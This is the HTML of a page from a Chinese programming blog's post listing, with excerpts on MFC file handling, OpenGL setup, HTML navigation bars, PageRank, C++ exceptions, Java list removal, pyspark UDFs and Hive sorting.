⛳️ 代码获取关注我 ❤️部分理论引用网络文献，若有侵权联系博主删除 ❤️ 关注我领取海量matlab电子书和数学建模资料 🍅 仿真咨询 1 各类智能优化算法改进及应用 生产调度、经济调度、装配线调度、充电优化、车间调度、发车优化、水库调度、三维装箱、物流选址、货位优化、公交排班优化、充电桩布局优化、车间布局优化、集装箱船配载优化、水泵组合优化、解医疗资源分配优化、设施布局优化、可视域基站和无人机选址优化 2 机器学习和深度学习方面 卷积神经网络（CNN）、LSTM、支持向量机（SVM）、最小二乘支持向量机（LSSVM）、极限学习机（ELM）、核极限学习机（KELM）、BP、RBF、宽度学习、DBN、RF、RBF、DELM、XGBOOST、TCN实现风电预测、光伏预测、电池寿命预测、辐射源识别、交通流预测、负荷预测、股价预测、PM2.5浓度预测、电池健康状态预测、水体光学参数反演、NLOS信号识别、地铁停车精准预测、变压器故障诊断 2.图像处理方面 图像识别、图像分割、图像检测、图像隐藏、图像配准、图像拼接、图像融合、图像增强、图像压缩感知 3 路径规划方面 旅行商问题（TSP）、车辆路径问题（VRP、MVRP、CVRP、VRPTW等）、无人机三维路径规划、无人机协同、无人机编队、机器人路径规划、栅格地图路径规划、多式联运运输问题、车辆协同无人机路径规划、天线线性阵列分布优化、车间布局优化 4 无人机应用方面 无人机路径规划、无人机控制、无人机编队、无人机协同、无人机任务分配 5 无线传感器定位及布局方面 传感器部署优化、通信协议优化、路由优化、目标定位优化、Dv-Hop定位优化、Leach协议优化、WSN覆盖优化、组播优化、RSSI定位优化 6 信号处理方面 信号识别、信号加密、信号去噪、信号增强、雷达信号处理、信号水印嵌入提取、肌电信号、脑电信号、信号配时优化 7 电力系统方面 微电网优化、无功优化、配电网重构、储能配置 8 元胞自动机方面 交通流 人群疏散 病毒扩散 晶体生长 9 雷达方面 卡尔曼滤波跟踪、航迹关联、航迹融合 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76772600cb89fcb368ca40e808a3ea7a/" rel="bookmark">
			MFC的文件操作——获取指定文件夹下面所有文件（夹）路径和删除指定文件夹下面所有文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.获取指定文件夹下面所有文件路径
2.删除指定文件夹下面所有文件
3.MFC的CString 字符串操作
4.MFC的 Int类型 与 Htuple类型数据之间转换
5.上述提及的函数应用
6.MFC与Halcon联合编程，获取halcon异常
7.MFC获取指定路径下的文件夹路径
①、文件夹路径获取方式
②、打开文件——文件路径获取方式
1.获取指定文件夹下面所有文件路径 //读取文件夹下的所有文件路径 void getFiles(CString path, vector&lt;CString&gt;&amp; files) { CFileFind find; BOOL IsFind = find.FindFile(path + _T("/*.*")); while (IsFind) { IsFind = find.FindNextFile(); if (find.IsDots()) { continue; } else { CString filename = _T(""); CString fullname = _T(""); filename = find.GetFileName(); fullname = path + filename; files.push_back(fullname); } } } 2.删除指定文件夹下面所有文件 //删除指定文件夹下面所有文件 void CDirectory::DeleteDirectory(const CString &amp;strPath) { CFileFind tempFind; TCHAR sTempFileFind[MAX_PATH] = { 0 }; wsprintf(sTempFileFind, _T("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/76772600cb89fcb368ca40e808a3ea7a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2565ee6800177e7ce923c152f3dd5d84/" rel="bookmark">
			Opengl安装（win10&#43;vs2019） 找了一个非常靠谱的，按照步骤安装完没有任何问题，给原作者点赞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		主要步骤：（已经安装好vs2019）
1）安装glew
2）安装glfw
3）安装freeglut
4）创建opengl项目，并完善设置（！容易漏做的步骤）
5）开始opengl
详情参见作者原文：opengl安装（win10, vs2019） - 这都几点了，该摸鱼了 - 博客园 (cnblogs.com)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf8de57d9fd7cba491d9ac80d3e99504/" rel="bookmark">
			HTML5网页设计小案例：网页导航栏的设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是导航栏，按我的理解就是位于网页顶部或者侧边一组链接或者按钮，用来指导大家找到网页的不同板块，大家可以一目了然的找到自己想看的板块内容。今天我们设计一个位于网页顶部的的导航栏。按我的生活经验来说，网页的顶部导航栏设计偏多，侧边导航栏偏设计偏少。
下面就让我们一步一步设计与实现一个购物网页的导航栏吧。
1 网页的总体设计 介绍：设置好网页的尺寸和背景颜色以及让网页居中显示。
代码块如下：
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;title&gt;&lt;/title&gt; &lt;link rel="stylesheet" href="css/111.css" /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="aa"&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; #aa{ width: 1050px; height: 800px; margin: 0 auto; text-align: center; background-color: #F0F8FF; /* text-align: center;div大盒子居中显示 background-color: #F0F8FF;背景颜色 margin: 0 auto;实际效果为左右居中 */	} 代码运行效果如下：
2 网页导航栏的设计 1）导航栏区域的设计
介绍：在网页顶部划定一个区域，用来放置导航栏，包括尺寸与背景颜色的设计
代码块如下
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;title&gt;&lt;/title&gt; &lt;link rel="stylesheet" href="css/111.css" /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="aa"&gt; &lt;div id="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cf8de57d9fd7cba491d9ac80d3e99504/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f10baadef6924f3c7b2f8660c9dae88/" rel="bookmark">
			了解什么是PR
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PR是Google排名算法的200多个因素之一，而且重要性已经下降很多。
当然，PR还是Google排名算法中的重要因素之一。除了直接影响排名，PR的重要性还体现以下几点。
（1）网站收录深度和总页面数。搜索引擎蜘蛛爬行时间及数据库的空间都是有限的。对大中型网站来说，首页PR值是带动网站收录的重要因素之一。
（2）更新频率。PR值越高的网站，搜索引擎蜘蛛访问得就越频繁，网站上出现新页面或旧页面上内容更新时，都能很快被收录。
（3）重复内容判定。当Google在不同网站上发现完全相同的内容时，会选出一个作为原创，其他作为转载或抄袭。
（4）排名初始子集的选择。初始子集的选择显然与关键词相关度无关，而只能从页面的重要程度着手，PR值就是与关键词无关的重要度指标。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5834b56220b6098d44bc1764c479054b/" rel="bookmark">
			C&#43;&#43;基础篇 第七天 异常、智能指针、nullptr，auto
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
异常
异常概念：
C和C++中异常的区别
异常处理
1. throw抛出异常
2. try...catch 进行异常处理
3.try...catch抛出自建类的异常
4.自建类的异常延伸
捕获的扩展
提高异常捕获的概率
智能指针
auto_ptr（已废弃，只做了解）
auto_ptr智能指针的方法
弃用原因（了解）：
unique_ptr
shared_ptr
weak_ptr
nullptr
auto 自动推导(基础)
异常 异常概念： C++的异常是指程序在运行期间出现的问题，编译可以通过，说明代码出现了逻辑问题，而不是语法问题。当程序运行的过程中出现了C++标准库中预定义的异常现象时，程序会抛出一个异常对象，此对象需要正确地处理，否则会导致运行终止。
C和C++中异常的区别 1. 异常的语法：C++中具有原生的异常处理机制，使用`try-catch`块来捕获和处理异常。而C语言并没有内置的异常处理机制，需要使用其他方式来处理错误，如返回错误码、使用全局变量等。
2. 异常类型：C++中的异常可以是任何类型的对象，包括内置类型、自定义类型、标准库类型等。而C语言中没有内置的异常类型概念，错误通常以错误码或特定的返回值表示。
3. 异常的传播：在C++中，异常可以在调用栈上进行传播，即从抛出异常的地方一直传播到能够处理异常的地方。而在C语言中，错误处理通常是通过返回错误码或特定值来传递的。
4. 异常处理的开销：由于C++中的异常处理机制涉及到对象的构造和析构、栈的展开等操作，因此异常处理可能会带来一定的性能开销。而C语言中的错误处理通常更加轻量级，不会引入额外的开销。
#include &lt;iostream&gt; using namespace std; int main() { string s="hello"; cout&lt;&lt;s.at(0)&lt;&lt;endl; cout&lt;&lt;s.at(10)&lt;&lt;endl; cout&lt;&lt;"程序继续运行。。"&lt;&lt;endl; } 正确的捕获方式
#include &lt;iostream&gt; #include &lt;stdexcept&gt; using namespace std; int main() { string s="hello"; cout&lt;&lt;s.at(0)&lt;&lt;endl; try{ cout&lt;&lt;s.at(10)&lt;&lt;endl; }catch(out_of_range a){ cout&lt;&lt;a.what()&lt;&lt;endl; } cout&lt;&lt;"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5834b56220b6098d44bc1764c479054b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/611e599805ebd4df1fc2274790400575/" rel="bookmark">
			List集合删除指定元素-四种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一种 for循环 System.out.println("增强for删除"); List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); list.add(1);list.add(2); list.add(3);list.add(8); list.add(4);list.add(9); list.add(5);list.add(10); List&lt;Integer&gt; del = new ArrayList&lt;&gt;(); for (Integer iteam:list){ if(iteam%2==0) del.add(iteam); } list2.removeAll(del); System.out.println("结果"+list); 输出结果为
第二种 迭代器 List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); list.add(1);list.add(2); list.add(3);list.add(8); list.add(4);list.add(9); list.add(5);list.add(10); System.out.println("迭代器循环删除"); ListIterator&lt;Integer&gt; integerListIterator = list.listIterator(); while (integerListIterator.hasNext()){ Integer next = integerListIterator.next(); if ((next%2)==0){ integerListIterator.remove(); } } System.out.println("结果"+list); 输出结果为
第三种 stream流 这种过滤是留下符合条件的元素
System.out.println("第三种 stream流"); List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); list.add(1);list.add(2); list.add(3);list.add(8); list.add(4);list.add(9); list.add(5);list.add(10); List&lt;Integer&gt; collect = list.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/611e599805ebd4df1fc2274790400575/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3397238bc8381fb2c3c0c13aad4b4189/" rel="bookmark">
			pyspark_自定义udf_解析json列【附代码】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pyspark_自定义udf_解析json列【附代码】 一、背景：二、调研方案：三、利用Pyspark + udf自定义函数实现大数据并行计算整体流程案例代码运行结果：案例代码：代码地址：代码 一、背景： 车联网数据有很多车的时序数据，现有一套云端算法需要对每一辆车历史数据进行计算得到结果，每日将全部车算一遍存到hive数仓中
二、调研方案： 1、python脚本运行，利用pyhive拉取数据到pandas进行处理，将结果to_parquet后用hdfs_client存到数仓中
问题：数据量上亿，对内存要求极大，无法直接拉取到python脚本所在的服务器内存中运算
2、将算法内容改写成SQL或者SPARKSQL，每日调度
问题：代码改写SQL要重新梳理代码逻辑，且很多函数SQL实现复杂，有些函数不支持
三、利用Pyspark + udf自定义函数实现大数据并行计算 整体流程 1、pyspark-spark sql拉取数据到spark df
2、spark df 按 车辆唯一标识分组，执行udf自定义函数（算法），每一个分组的返回值是String类型的json字符串，执行完成后返回的是result_df， spark_df【索引（车辆唯一标识）、数据（String类型的json字符串）】
3、解析json并拼接成spark_df
4、spark_df生成临时表，将临时表数据写入hive数仓
案例代码运行结果： 案例代码： 代码地址： https://github.com/SeafyLiang/Python_study/blob/master/pyspark_demo/pyspark_udf_json.py
代码 from pyspark.sql import SparkSession # SparkConf、SparkContext 和 SQLContext 都已经被封装在 SparkSession from pyspark.sql import functions as F import pandas as pd from pyspark.sql import types as T # spark df的数据类型 from pyspark.sql.functions import array, from_json, col, explode import sys def get_auc(id, date, vol): temp_df = pd.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3397238bc8381fb2c3c0c13aad4b4189/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7adab7198fca55c032a9fa043ddbcde0/" rel="bookmark">
			Hive的Sort By与Distribute By
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		每个 Reduce 内部排序（Sort By） Sort By：对于大规模的数据集 order by 的效率非常低。在很多情况下，并不需要全局排序，此时可以使用 sort by。
Sort by 为每个 reducer 产生一个排序文件。每个 Reducer 内部进行排序，对全局结果集来说不是排序。
1）设置 reduce 个数
hive (default)&gt; set mapreduce.job.reduces=3; 2）查看设置 reduce 个数
hive (default)&gt; set mapreduce.job.reduces; 3）根据部门编号降序查看员工信息
hive (default)&gt; select * from emp sort by deptno desc; 4）将查询结果导入到文件中（按照部门编号降序排序）
hive (default)&gt; insert overwrite local directory '/opt/module/data/sortby-result' select * from emp sort by deptno desc; 分区（Distribute By） Distribute By： 在有些情况下，我们需要控制某个特定行应该到哪个 reducer，通常是为了进行后续的聚集操作。distribute by 子句可以做这件事。distribute by 类似 MR 中 partition（自定义分区），进行分区，结合 sort by 使用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7adab7198fca55c032a9fa043ddbcde0/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/61/">«</a>
	<span class="pagination__item pagination__item--current">62/279</span>
	<a class="pagination__item pagination__item--next btn" href="/page/63/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>